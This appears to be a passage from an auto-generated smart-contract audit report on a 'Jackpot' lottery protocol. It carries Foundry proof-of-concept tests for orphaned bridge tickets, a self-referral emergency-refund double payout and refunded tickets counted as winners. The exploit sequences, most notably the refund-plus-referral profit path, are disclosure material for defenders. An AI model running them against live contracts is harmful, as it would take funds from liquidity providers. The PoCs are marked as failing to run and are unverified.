import {Jackpot} from "../contracts/Jackpot.sol";
import {JackpotLPManager} from "../contracts/JackpotLPManager.sol";
import {JackpotTicketNFT} from "../contracts/JackpotTicketNFT.sol";
import {JackpotBridgeManager} from "../contracts/JackpotBridgeManager.sol";
import {IJackpot} from "../contracts/interfaces/IJackpot.sol";
import {IPayoutCalculator} from "../contracts/interfaces/IPayoutCalculator.sol";
import {IScaledEntropyProvider} from "../contracts/interfaces/IScaledEntropyProvider.sol";

contract ERC20Mock is ERC20 {
    uint8 private _decimals;
    constructor(string memory n, string memory s, uint8 d) ERC20(n, s) { _decimals = d; }
    function decimals() public view override returns (uint8) { return _decimals; }
    function mint(address to, uint256 amt) external { _mint(to, amt); }
}

// Lightweight stubs to avoid heavy dependencies
contract DummyPayout is IPayoutCalculator {
    function calculateAndStoreDrawingUserWinnings(
        uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory
    ) external pure returns (uint256) { return 0; }
    function setDrawingTierInfo(uint256) external {}
    function getTierPayout(uint256, uint256) external pure returns (uint256) { return 0; }
}

contract DummyEntropy is IScaledEntropyProvider {
    function requestAndCallbackScaledRandomness(
        uint32, SetRequest[] memory, bytes4, bytes memory
    ) external payable returns (uint64) { return 1; }
    function getFee(uint32) external view returns (uint256) { return 0; }
}

contract BridgeTicketPriceDesyncTest is Test {
    ERC20Mock usdc;
    Jackpot jackpot;
    JackpotLPManager lpManager;
    JackpotTicketNFT nft;
    DummyPayout payout;
    DummyEntropy entropy;
    JackpotBridgeManager bridge;

    address lp = address(0xBEEF);
    address relayer = address(0xCAFE);
    address user = address(0xF00D);

    uint256 constant USDC_UNIT = 1e6;

    function setUp() public {
        usdc = new ERC20Mock("USDC", "USDC", 6);

        jackpot = new Jackpot(
            1 days,
            35,            // normalBallMax
            5,             // bonusballMin
            2e17,          // lpEdgeTarget = 20%
            1e17,          // reserveRatio = 10%
            0,             // referralFee
            0,             // referralWinShare
            0,             // protocolFee
            0,             // protocolFeeThreshold
            1 * USDC_UNIT, // ticketPrice = 1 USDC
            5,             // maxReferrers
            500_000        // entropyBaseGasLimit
        );

        lpManager = new JackpotLPManager(IJackpot(address(jackpot)));
        nft = new JackpotTicketNFT(IJackpot(address(jackpot)));
        payout = new DummyPayout();
        entropy = new DummyEntropy();

        jackpot.initialize(IERC20(address(usdc)), lpManager, nft, entropy, payout);
        jackpot.initializeLPDeposits(1_000_000 * USDC_UNIT);

        usdc.mint(lp, 1_000 * USDC_UNIT);
        vm.startPrank(lp);
        usdc.approve(address(jackpot), type(uint256).max);
        jackpot.lpDeposit(500 * USDC_UNIT);
        vm.stopPrank();

        jackpot.initializeJackpot(block.timestamp);

        bridge = new JackpotBridgeManager(IJackpot(address(jackpot)), nft, IERC20(address(usdc)), "Bridge", "1");
    }

    function _ticket() internal pure returns (IJackpot.Ticket[] memory t) {
        t = new IJackpot.Ticket[](1);
        t[0].normals = new uint8[](5);
        t[0].normals[0] = 1;
        t[0].normals[1] = 2;
        t[0].normals[2] = 3;
        t[0].normals[3] = 4;
        t[0].normals[4] = 5;
        t[0].bonusball = 1;
    }

    function test_Overcharge_surplusGetsStrandedInBridge() public {
        uint256 currentId = jackpot.currentDrawingId();
        Jackpot.DrawingState memory ds = jackpot.getDrawingState(currentId);
        uint256 snapPrice = ds.ticketPrice; // per-drawing snapshot

        // Governance increases global ticketPrice mid-drawing (affects next drawing, not this one)
        jackpot.setTicketPrice(snapPrice * 2); // global > snapshot

        IJackpot.Ticket[] memory tickets = _ticket();
        uint256 globalCost = jackpot.ticketPrice() * tickets.length; // 2x snapshot

        usdc.mint(relayer, globalCost);
        vm.startPrank(relayer);
        usdc.approve(address(bridge), globalCost);
        bridge.buyTickets(tickets, user, new address[](0), new uint256[](0), bytes32("SRC"));
        vm.stopPrank();

        uint256 leftover = usdc.balanceOf(address(bridge));
        assertGt(leftover, 0, "surplus should be stranded on BridgeManager");
        assertEq(leftover, globalCost - snapPrice * tickets.length, "leftover equals overcharge");
    }

    function test_Undercharge_bridgeBuyRevertsWhenGlobalBelowSnapshot() public {
        uint256 currentId = jackpot.currentDrawingId();
        uint256 snapPrice = jackpot.getDrawingState(currentId).ticketPrice;

        jackpot.setTicketPrice(snapPrice / 2); // global < snapshot

        IJackpot.Ticket[] memory tickets = _ticket();
        uint256 globalCost = jackpot.ticketPrice() * tickets.length; // half snapshot

        usdc.mint(relayer, globalCost);
        vm.startPrank(relayer);
        usdc.approve(address(bridge), globalCost);
        // Jackpot will attempt to pull `snapPrice`, but allowance/balance is only `globalCost` -> revert
        vm.expectRevert();
        bridge.buyTickets(tickets, user, new address[](0), new uint256[](0), bytes32("SRC2"));
        vm.stopPrank();
    }
}


## Suggested Mitigation
In JackpotBridgeManager.buyTickets(), compute and pay the exact per-drawing cost instead of using the global Jackpot.ticketPrice():
- Read the current drawing’s snapshotted price and multiply by the ticket count: cost = jackpot.getDrawingState(jackpot.currentDrawingId()).ticketPrice * _tickets.length. Expose a dedicated getter (e.g., getCurrentDrawingTicketPrice()) or add getDrawingState/currentDrawingId to IJackpot so the bridge can read the snapshot.
- Pull exactly this amount from msg.sender and approve exactly this amount to Jackpot before calling jackpot.buyTickets.
- Optionally, after the call, if any unexpected USDC remains due to edge cases, immediately refund the surplus to msg.sender to avoid stranded balances.
This ensures: no overcharge/stranded funds when governance updates ticketPrice mid-drawing, and no undercharge/DoS due to insufficient allowance.





 **Derived From** : forall t in returned ticketIds: IERC721(address(jackpotTicketNFT)).ownerOf(t) == address(this) && ticketOwner[t] == _recipient

## [L-17]. Anyone can mint tickets to BridgeManager and desync custody vs ticketOwner mapping, permanently orphaning tickets

### Finding Severity Justification: Anyone can call Jackpot.buyTickets with recipient = JackpotBridgeManager, minting NFTs to the bridge without populating its ticketOwner mapping. This creates untracked (orphan) tickets that cannot be claimed or transferred via BridgeManager’s flows. However, the attacker must pay full ticket cost; no assets are stolen and no external user funds are put at risk. Economic impact to LPs is not greater than normal ticket purchases (settlement accounts winners regardless of later claims), and this does not meaningfully DoS the system. The issue is a design/UX pitfall causing permanently stuck tickets, not a drain.
## Derived From Pattern/Invariant
forall t in returned ticketIds: IERC721(address(jackpotTicketNFT)).ownerOf(t) == address(this) && ticketOwner[t] == _recipient

## Exploit Type
EventConsistency

## Location
JackpotBridgeManager.buyTickets

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 3
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
JackpotBridgeManager.buyTickets ensures referential consistency by minting NFTs to the BridgeManager while assigning ticketOwner[ticketId] = _recipient. However, Jackpot.buyTickets is permissionless and accepts any _recipient. A malicious EOA can call Jackpot.buyTickets directly and set _recipient = address(BridgeManager). The NFT is then minted to the BridgeManager without updating JackpotBridgeManager.ticketOwner or its per-user UserTickets tracking. This breaks the intended referential invariant (custody at BridgeManager + internal owner mapping) for those tickets. Consequences: (1) the tickets are permanently stuck in BridgeManager (BridgeManager won’t transfer or claim them because _validateTicketOwnership fails due to missing mapping), (2) if such tickets later win, drawingUserWinnings still accounts for them (reducing LP value), but the winnings remain unclaimable, effectively locking funds and degrading protocol UX/economics, and (3) griefers can spam orphan tickets to bloat BridgeManager custody and create unclaimable obligations. Vulnerable paths: the invariant relies on BridgeManager.buyTickets to populate mappings, but Jackpot’s public buyTickets allows minting to BridgeManager outside that flow.

## Impact
Tickets minted directly to JackpotBridgeManager via Jackpot.buyTickets(_recipient = bridgeManager) are not recorded in BridgeManager.ticketOwner/userTickets. These NFTs become unclaimable via BridgeManager’s flows, permanently locking their potential winnings. At settlement, these tickets are still counted as user-owned winners (via TicketComboTracker’s results), so drawingUserWinnings is deducted from LP value even if no one can ever claim those winnings. This does not worsen LP economics beyond the normal EV of ticket sales (the attacker still pays full price), but it creates permanently stuck obligations in the Jackpot contract and degrades UX and accounting clarity.

## Command to Run Test


## Proof of Concept
1) Attacker calls Jackpot.buyTickets with _recipient set to the deployed JackpotBridgeManager address. 2) Jackpot mints the ticket NFT(s) to the BridgeManager (custody), but BridgeManager.ticketOwner[...] is never set because BridgeManager.buyTickets was bypassed. 3) BridgeManager’s claim/transfer flows validate ownership via the internal ticketOwner mapping. Since it is unset, claimTickets/claimWinnings revert with NotTicketOwner. 4) These tickets are still included in user winner counts at settlement, so LP value is reduced by the corresponding drawingUserWinnings while the winnings remain permanently locked, as no authorized path exists to claim them.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {JackpotBridgeManager} from "contracts/JackpotBridgeManager.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IJackpotTicketNFT} from "contracts/interfaces/IJackpotTicketNFT.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {JackpotErrors} from "contracts/lib/JackpotErrors.sol";

contract MockTicketNFT is IJackpotTicketNFT {
    struct Tracked { uint256 drawingId; uint256 packed; bytes32 scheme; }
    mapping(uint256 => Tracked) internal _t;
    mapping(uint256 => address) internal _owner;

    function mintTicket(address recipient, uint256 ticketId, uint256 drawingId, uint256 packedTicket, bytes32 referralScheme) external {
        _t[ticketId] = Tracked({drawingId: drawingId, packed: packedTicket, scheme: referralScheme});
        _owner[ticketId] = recipient;
    }

    function burnTicket(uint256 ticketId) external {
        delete _owner[ticketId];
        delete _t[ticketId];
    }

    function getTicketInfo(uint256 ticketId) external view returns (TrackedTicket memory) {
        Tracked memory m = _t[ticketId];
        return TrackedTicket({ drawingId: m.drawingId, packedTicket: m.packed, referralScheme: m.scheme });
    }

    function getUserTickets(address, uint256) external pure returns (ExtendedTrackedTicket[] memory) {
        return new ExtendedTrackedTicket[](0);
    }

    // Minimal ownerOf compatible with BridgeManager expectations
    function ownerOf(uint256 tokenId) external view returns (address) {
        address o = _owner[tokenId];
        require(o != address(0), "burned");
        return o;
    }

    // Minimal safeTransferFrom to satisfy BridgeManager._updateTicketOwnership path if ever reached
    function safeTransferFrom(address from, address to, uint256 tokenId) external {
        require(_owner[tokenId] == from, "not owner");
        _owner[tokenId] = to;
    }
}

contract MockJackpot is IJackpot {
    MockTicketNFT public nft;
    uint256 public price = 1e6;
    uint256 public drawId = 1;
    constructor(MockTicketNFT _nft) { nft = _nft; }

    function buyTickets(Ticket[] memory _tickets, address _recipient, address[] memory, uint256[] memory, bytes32)
        external returns (uint256[] memory ticketIds)
    {
        ticketIds = new uint256[](_tickets.length);
        for (uint256 i = 0; i < _tickets.length; i++) {
            // Simplified deterministic id for test
            uint256 tid = uint256(keccak256(abi.encode(drawId, i, uint256(0xBEEF))));
            ticketIds[i] = tid;
            nft.mintTicket(_recipient, tid, drawId, 0, bytes32(0));
        }
    }

    function claimWinnings(uint256[] memory) external {}
    function ticketPrice() external view returns (uint256) { return price; }
    function currentDrawingId() external view returns (uint256) { return drawId; }
    function getUnpackedTicket(uint256, uint256) external pure returns (uint8[] memory normals, uint8 bonusball) {
        normals = new uint8[](5); normals[0]=1; normals[1]=2; normals[2]=3; normals[3]=4; normals[4]=5; bonusball=1;
    }
}

contract OrphanTicketsFoundryTest is Test {
    JackpotBridgeManager bm;
    MockJackpot jack;
    MockTicketNFT nft;

    // EOA for attacker
    uint256 attackerPk = uint256(0xA11CE);
    address attacker;

    function setUp() public {
        nft = new MockTicketNFT();
        jack = new MockJackpot(nft);
        // USDC is unused in this PoC; provide any non-zero address
        bm = new JackpotBridgeManager(IJackpot(address(jack)), IJackpotTicketNFT(address(nft)), IERC20(address(1)), "BM", "1");
        attacker = vm.addr(attackerPk);
    }

    function test_OrphanTickets_BlockClaimViaBridgeManager() public {
        // 1) Attacker mints a ticket directly to BridgeManager via Jackpot (bypassing bm.buyTickets)
        IJackpot.Ticket[] memory t = new IJackpot.Ticket[](1);
        t[0].normals = new uint8[](5); t[0].normals[0]=1; t[0].normals[1]=2; t[0].normals[2]=3; t[0].normals[3]=4; t[0].normals[4]=5; t[0].bonusball=1;

        vm.prank(attacker);
        uint256[] memory ids = jack.buyTickets(t, address(bm), new address[](0), new uint256[](0), bytes32(0));
        uint256 tid = ids[0];

        // Sanity: NFT is owned by BridgeManager (custody), but no ticketOwner mapping is set
        assertEq(MockTicketNFT(nft).ownerOf(tid), address(bm), "BM should custody the NFT");
        assertEq(bm.ticketOwner(tid), address(0), "ticketOwner should be unset (orphan)");

        // 2) User attempts to claim tickets from BridgeManager with a valid EIP-712 signature
        uint256[] memory claimIds = new uint256[](1);
        claimIds[0] = tid;
        bytes32 digest = bm.createClaimTicketEIP712Hash(claimIds, attacker);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(attackerPk, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        // 3) Expect revert: NotTicketOwner since bm.ticketOwner[tid] == address(0)
        vm.expectRevert(abi.encodeWithSelector(JackpotErrors.NotTicketOwner.selector));
        bm.claimTickets(claimIds, attacker, sig);
    }
}


## Suggested Mitigation
Block third-party minting to BridgeManager custody and/or provide a safe adoption path:
- Preferred: In Jackpot.buyTickets, restrict custodian recipients. Add a configurable bridgeManager allowlist and require that if _recipient is an approved custodian (e.g., JackpotBridgeManager), then msg.sender must be that custodian. Example: if (custodians[_recipient]) require(msg.sender == _recipient). This guarantees BridgeManager.buyTickets is the only path to mint into bridge custody and ensures mappings are populated.
- Additionally (defense-in-depth): Add a controlled adoption function in JackpotBridgeManager to map pre-existing orphaned tickets minted to itself. Require: ownerOf(ticketId) == address(this), mapping unset, and a privileged actor (owner) or an authorized keeper sets ticketOwner[ticketId] based on off-chain proof or an EIP-712 signature from the intended owner. This prevents permanent lock if legacy or cross-environment mistakes occur.
- Optional: If you can change JackpotTicketNFT, switch to safeMint and implement ERC721Receiver in BridgeManager to accept only mints that include an authenticated context (e.g., mint initiated by BridgeManager). Since current NFT uses _mint, the first restriction at Jackpot is the cleanest fix.





 **Derived From** : Emergency refunds use current referralFee instead of purchase-time value, over/under-refunding

## [M-18]. Emergency refunds mis-account referred tickets by using mutable referralFee, enabling refund+referral double-payout

### Finding Severity Justification: Emergency refunds for referred tickets use the mutable global referralFee instead of the purchase-time value, allowing over-refunds (and under-refunds) when referralFee changes mid-drawing or after enabling emergency mode. This can cause real loss of LP assets equal to the referral portion per refunded ticket, but only in emergency refunds and contingent on parameter changes, so impact is real but context-limited.
## Derived From Pattern/Invariant
Emergency refunds use current referralFee instead of purchase-time value, over/under-refunding

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.emergencyRefundTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
Jackpot.emergencyRefundTickets computes refunds for referred tickets with the CURRENT global referralFee instead of the fee applied when the ticket was bought. Vulnerable code: refundAmount = ticketInfo.referralScheme == bytes32(0) ? drawingState[ticketInfo.drawingId].ticketPrice : drawingState[ticketInfo.drawingId].ticketPrice * (PRECISE_UNIT - referralFee) / PRECISE_UNIT;. The contract never snapshots referralFee per drawing or per ticket (unlike referralWinShare), so if governance changes referralFee mid‑drawing and later enables emergency mode, refunds become inconsistent with purchase-time economics. An attacker who bought with a nonzero referralFee and set themselves as referrer can get a full refund when referralFee is later set to 0 and also claim the previously accrued referral fees, yielding profit equal to referralFee_at_purchase * ticketPrice per ticket. This violates conservation (ticketRevenue ≠ refunds + referral payouts + LP earnings) and the shortfall is borne by the LP pool.

## Impact
LP pool loses the referral portion per refunded referred ticket when referralFee was reduced before refunds; attacker can profit by self-referring and claiming both full refund and referral fees.

## Command to Run Test


## Proof of Concept
1) Initial referralFee = 20%. 2) Attacker self-refers and buys a ticket (referralFees[attacker] credited with 20% of ticketPrice). 3) Owner later enables emergencyMode and (legitimately) updates referralFee to 0. 4) Attacker calls emergencyRefundTickets to get full ticketPrice refunded (uses current referralFee=0). 5) Attacker calls claimReferralFees to receive the 20% credited at purchase. Net profit = 20% of ticketPrice per ticket; LP funds cover the loss.

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {Jackpot} from "contracts/Jackpot.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IPayoutCalculator} from "contracts/interfaces/IPayoutCalculator.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MockERC20 is IERC20 {
    string public name = "MockUSDC";
    string public symbol = "mUSDC";
    uint8 public decimals = 6;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; totalSupply += amount; emit Transfer(address(0), to, amount); }
    function transfer(address to, uint256 amount) external override returns (bool){ require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; emit Transfer(msg.sender,to,amount); return true; }
    function approve(address spender, uint256 amount) external override returns (bool){ allowance[msg.sender][spender]=amount; emit Approval(msg.sender,spender,amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external override returns (bool){ require(balanceOf[from] >= amount, "bal"); uint256 a=allowance[from][msg.sender]; require(a>=amount, "allow"); if(a!=type(uint256).max){ allowance[from][msg.sender]=a-amount; } balanceOf[from]-=amount; balanceOf[to]+=amount; emit Transfer(from,to,amount); return true; }
}

contract DummyEntropy is IScaledEntropyProvider {
    function requestAndCallbackScaledRandomness(uint32, SetRequest[] memory, bytes4, bytes memory) external payable returns (uint64){ return 0; }
    function getFee(uint32) external view returns (uint256){ return 0; }
}

contract PayoutCalcMock is IPayoutCalculator {
    function calculateAndStoreDrawingUserWinnings(uint256, uint256, uint8, uint8, uint256[] memory, uint256[] memory) external pure returns (uint256){ return 0; }
    function setDrawingTierInfo(uint256) external {}
    function getTierPayout(uint256, uint256) external pure returns (uint256){ return 0; }
}

contract EmergencyRefundReferralFeeSnapshotTest is Test {
    uint256 constant PRECISE_UNIT = 1e18;
    MockERC20 usdc;
    Jackpot jackpot;
    JackpotLPManager lpMgr;
    JackpotTicketNFT nft;
    DummyEntropy entropy;
    PayoutCalcMock pc;

    address owner = address(this);
    address lp = address(0xBEEF);
    address attacker = address(0xA11CE);

    function setUp() public {
        usdc = new MockERC20();
        entropy = new DummyEntropy();
        pc = new PayoutCalcMock();

        // constructor params
        uint256 drawingDuration = 1 days;
        uint8 normalBallMax = 35;
        uint8 bonusballMin = 1;
        uint256 lpEdgeTarget = 1e17; // 10%
        uint256 reserveRatio = 1e17; // 10%
        uint256 referralFee = 2e17; // 20%
        uint256 referralWinShare = 1e17; // unused here
        uint256 protocolFee = 0;
        uint256 protocolFeeThreshold = 0;
        uint256 ticketPrice = 100e6; // 100 USDC
        uint256 maxReferrers = 1;
        uint32 entropyBaseGasLimit = 200000;

        jackpot = new Jackpot(
            drawingDuration,
            normalBallMax,
            bonusballMin,
            lpEdgeTarget,
            reserveRatio,
            referralFee,
            referralWinShare,
            protocolFee,
            protocolFeeThreshold,
            ticketPrice,
            maxReferrers,
            entropyBaseGasLimit
        );

        lpMgr = new JackpotLPManager(IJackpot(address(jackpot)));
        nft = new JackpotTicketNFT(IJackpot(address(jackpot)));

        jackpot.initialize(IERC20(address(usdc)), lpMgr, nft, IScaledEntropyProvider(address(entropy)), pc);

        // Initialize LP system
        jackpot.initializeLPDeposits(10_000_000e6);

        // Seed LP and attacker balances
        usdc.mint(lp, 1_000_000e6);
        usdc.mint(attacker, 1_000e6);

        // LP deposit
        vm.startPrank(lp);
        usdc.approve(address(jackpot), type(uint256).max);
        jackpot.lpDeposit(1_000_000e6);
        vm.stopPrank();

        // Initialize jackpot (creates drawingId=1 with nonzero prizePool)
        jackpot.initializeJackpot(block.timestamp + 3600);
    }

    function test_OverRefundAndDoublePayReferralOnFeeChange() public {
        // Attacker self-refers and buys 1 ticket when referralFee = 20%
        IJackpot.Ticket[] memory tickets = new IJackpot.Ticket[](1);
        uint8[] memory normals = new uint8[](5);
        normals[0]=1; normals[1]=2; normals[2]=3; normals[3]=4; normals[4]=5;
        tickets[0] = IJackpot.Ticket({normals: normals, bonusball: 1});

        address[] memory refs = new address[](1);
        refs[0] = attacker; // self-referral
        uint256[] memory splits = new uint256[](1);
        splits[0] = PRECISE_UNIT;

        vm.startPrank(attacker);
        uint256 attackerStart = usdc.balanceOf(attacker);
        usdc.approve(address(jackpot), type(uint256).max);
        uint256[] memory ids = jackpot.buyTickets(tickets, attacker, refs, splits, bytes32(0));
        vm.stopPrank();

        // Owner enables emergency mode and updates referralFee to 0
        jackpot.enableEmergencyMode();
        jackpot.setReferralFee(0);

        // Attacker refunds ticket -> gets FULL ticketPrice (uses current referralFee=0)
        vm.startPrank(attacker);
        uint256[] memory toRefund = new uint256[](1);
        toRefund[0] = ids[0];
        jackpot.emergencyRefundTickets(toRefund);
        vm.stopPrank();

        // Attacker then claims accrued referral fees from purchase-time (20%)
        vm.prank(attacker);
        jackpot.claimReferralFees();

        uint256 attackerEnd = usdc.balanceOf(attacker);

        // Profit must be > 0 (specifically ~20% of ticketPrice)
        assertGt(attackerEnd, attackerStart);

        // Sanity: jackpot paid at least ticketPrice back during refund
        // and additionally the referral fee when claimed, funded by LP pool.
        // Contract USDC decreased by >= referral portion.
        uint256 ticketPrice = jackpot.ticketPrice();
        // Attacker should have gained approximately referralFee_at_purchase * ticketPrice = 20 USDC
        assertEq(attackerEnd - attackerStart, (ticketPrice * 2e17) / 1e18);
    }
}


## Suggested Mitigation
Robustly decouple emergency refunds from the mutable global referralFee value. Recommended fix: (1) Add referralFee to DrawingState and set it in _setNewDrawingState using the then-current global referralFee. (2) In _validateAndTrackReferrals, compute referralFeeTotal using drawingState[currentDrawingId].referralFee (not the global). (3) In emergencyRefundTickets, compute refund using drawingState[ticketInfo.drawingId].referralFee. This ensures all tickets in a drawing are treated consistently even if governance changes referralFee mid-drawing or while emergency mode is active. Alternative: store the applied referral fee per ticket (e.g., an extra uint256 in JackpotTicketNFT.TrackedTicket set at mint) and use that per-ticket value during emergency refunds. If adopting the per-drawing snapshot approach, ensure governance changes to global referralFee only affect future drawings by never reading the global in buyTickets or emergency refunds.





 **Derived From** : Emergency refunds don’t reverse combo-tracker/prize-pool state → double-count and insolvency risk

## [L-19]. Refunded tickets still counted as winners after disabling emergency mode cause LP losses and underpaid winners

### Finding Severity Justification: Impact exists (LP pool debited for phantom winners; real winners underpaid) but it requires the trusted owner to enable emergency mode, allow refunds, and then disable emergency mode and settle the same drawing, which contradicts the documented intent: "Emergency mode is not intended to be recoverable." This makes it a governance/operator-misuse risk per Code4rena rules, capped at Low.
## Derived From Pattern/Invariant
Emergency refunds don’t reverse combo-tracker/prize-pool state → double-count and insolvency risk

## Exploit Type
AccountingInvariantViolation

## Location
Jackpot.emergencyRefundTickets

## Finding Status: Valid
## Status Confidence: VeryConfident
### Finding Complexity: 6
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:RequiresAdminRole


## Description
Jackpot.emergencyRefundTickets burns the NFT and refunds USDC but does not unwind accounting for the refunded ticket. Specifically, it does not remove the ticket from drawingEntries[currentDrawingId] nor decrement any drawingState[...] counters (prizePool adjustments for duplicates, globalTicketsBought, lpEarnings). If the owner later disables emergency mode and a caller runs the drawing, TicketComboTracker will still count the refunded tickets as winners when computing uniqueResult/dupResult. PayoutCalculator will then divide the premium pool by an inflated number of winners and calculate drawingUserWinnings that includes these refunded tickets. Settlement debits LP value using this overstated drawingUserWinnings, but the refunded tickets cannot be claimed (NFTs were burned), so their portion remains stranded in the contract. This breaks conservation of payouts: user winners are underpaid, and LP value is reduced as if winners existed. Vulnerable snippet (omissions shown):

function emergencyRefundTickets(uint256[] memory _userTicketIds) external nonReentrant onlyEmergencyMode {
    ...
    jackpotNFT.burnTicket(ticketId); // burns NFT only
    // No delete from drawingEntries[currentDrawingId]
    // No unwind of drawingState[currentDrawingId].prizePool/globalTicketsBought/lpEarnings
}


## Impact
If emergencyRefundTickets is used and the owner later disables emergency mode and settles the same drawing, refunded tickets remain in the TicketComboTracker and are still counted during settlement. This leads to two effects: (1) Phantom user payouts are included in drawingUserWinnings even though the corresponding NFTs were burned and can never be claimed, which debits LP value and strands funds in the contract; and (2) for tiers where refunded tickets had been duplicates, dupResult remains inflated and is included in the premium allocation denominator, lowering the per-ticket payout for actual winners in those tiers. For tiers where refunded tickets were unique (non-duplicates), per-ticket payout is unaffected, but the LP pool is still debited for phantom payouts.

## Command to Run Test


## Proof of Concept
High-level steps to reproduce:
1) Initialize the protocol, seed LP, and start a drawing. Configure the payout calculator so the premium pool is fully allocated to tier 11 (5 matches + bonusball) with no minimum payouts (weights[11] = 1e18, all else 0; premiumTierMinAllocation = 0).
2) Two users buy the same ticket combination that will be drawn as the winner (e.g., normals [1,2,3,4,5], bonusball=1). The second purchase is a duplicate.
3) Owner enables emergency mode; user A refunds their ticket (burns NFT). Owner disables emergency mode without cancelling the drawing.
4) Owner locks the drawing; the entropy provider callback settles the drawing with the exact winning numbers.
5) Effects:
   - TicketComboTracker still contains both the unique and duplicate entries. dupResult remains 1. uniqueResult still includes the refunded ticket.
   - PayoutCalculator computes per-ticket payout using tierWinners = theoretical_winners + dupResult. Since dupResult = 1 for the jackpot tier, per-ticket payout is reduced by ~50% vs the case where dupResult would be 0.
   - drawingUserWinnings includes the refunded (burned) ticket, debiting LP value for a winner that cannot claim. The remaining real winner receives the reduced per-ticket payout (if the refunded one was a duplicate).

## Proof of Code
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Jackpot} from "contracts/Jackpot.sol";
import {JackpotLPManager} from "contracts/JackpotLPManager.sol";
import {JackpotTicketNFT} from "contracts/JackpotTicketNFT.sol";
import {GuaranteedMinimumPayoutCalculator} from "contracts/GuaranteedMinimumPayoutCalculator.sol";
import {IJackpot} from "contracts/interfaces/IJackpot.sol";
import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";

contract MockUSDC {
    string public name = "MockUSDC";
    string public symbol = "USDC";
    uint8 public decimals = 6;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 amount);
    function mint(address to, uint256 amount) external { balanceOf[to] += amount; emit Transfer(address(0), to, amount); }
    function approve(address spender, uint256 amount) external returns (bool) { allowance[msg.sender][spender] = amount; emit Approval(msg.sender, spender, amount); return true; }
    function transfer(address to, uint256 amount) external returns (bool) { require(balanceOf[msg.sender] >= amount, "bal"); balanceOf[msg.sender]-=amount; balanceOf[to]+=amount; emit Transfer(msg.sender,to,amount); return true; }
    function transferFrom(address from, address to, uint256 amount) external returns (bool) { uint256 a = allowance[from][msg.sender]; require(a>=amount, "allow"); allowance[from][msg.sender]=a-amount; require(balanceOf[from]>=amount, "bal"); balanceOf[from]-=amount; balanceOf[to]+=amount; emit Transfer(from,to,amount); return true; }
}

// Minimal dummy entropy that can call Jackpot.scaledEntropyCallback as the configured entropy
contract DummyEntropy is IScaledEntropyProvider {
    function requestAndCallbackScaledRandomness(uint32, SetRequest[] memory, bytes4, bytes memory) external payable returns (uint64) { return 0; }
    function getFee(uint32) external view returns (uint256) { return 0; }
    function settle(Jackpot jp, uint256[][] memory numbers) external {
        jp.scaledEntropyCallback(bytes32(0), numbers, bytes(""));
    }
}

contract RefundedTicketsCountedTest is Test {
    MockUSDC usdc;
    Jackpot jp;
    JackpotLPManager lpm;
    JackpotTicketNFT nft;
    GuaranteedMinimumPayoutCalculator pc;
    DummyEntropy entropy;

    address owner = address(this);
    address lp = address(0xBEEF);
    address userA = address(0xAAA1); // will refund
    address userB = address(0xBBB2); // will remain winner

    function setUp() public {
        usdc = new MockUSDC();
        // Constructor params
        jp = new Jackpot({
            _drawingDurationInSeconds: 1 hours,
            _normalBallMax: 35,
            _bonusballMin: 1,
            _lpEdgeTarget: 2e17,          // 20%
            _reserveRatio: 2e17,          // 20%
            _referralFee: 0,
            _referralWinShare: 0,
            _protocolFee: 0,
            _protocolFeeThreshold: 0,
            _ticketPrice: 10_000000,      // 10 USDC
            _maxReferrers: 5,
            _entropyBaseGasLimit: 200000
        });
        lpm = new JackpotLPManager(IJackpot(address(jp)));
        nft = new JackpotTicketNFT(IJackpot(address(jp)));
        pc = new GuaranteedMinimumPayoutCalculator(IJackpot(address(jp)), 0, 0, _allFalse(), _jackpotOnlyWeights());
        entropy = new DummyEntropy();

        // Wire up
        jp.initialize(IERC20(address(usdc)), lpm, nft, IScaledEntropyProvider(address(entropy)), pc);

        // Init LP side
        jp.initializeLPDeposits(1_000_000_000_000000);
        usdc.mint(lp, 1_000_000_000_000000);
        vm.startPrank(lp);
        usdc.approve(address(jp), type(uint256).max);
        jp.lpDeposit(1_000_000_000_000000);
        vm.stopPrank();

        // Start first drawing
        jp.initializeJackpot(block.timestamp + 1);
        vm.warp(block.timestamp + 2);

        // Fund users
        usdc.mint(userA, 100_000_000);
        usdc.mint(userB, 100_000_000);
        vm.prank(userA); usdc.approve(address(jp), type(uint256).max);
        vm.prank(userB); usdc.approve(address(jp), type(uint256).max);
    }

    function test_refundedTicketsStillCounted_reduceLP_and_burnedUnclaimable() public {
        // Both users buy the same ticket (second is a duplicate)
        IJackpot.Ticket[] memory ts = new IJackpot.Ticket[](1);
        ts[0] = IJackpot.Ticket({ normals: _arr5(1,2,3,4,5), bonusball: 1 });
        vm.prank(userA);
        uint256[] memory idA = jp.buyTickets(ts, userA, new address[](0), new uint256[](0), bytes32("SRC"));
        vm.prank(userB);
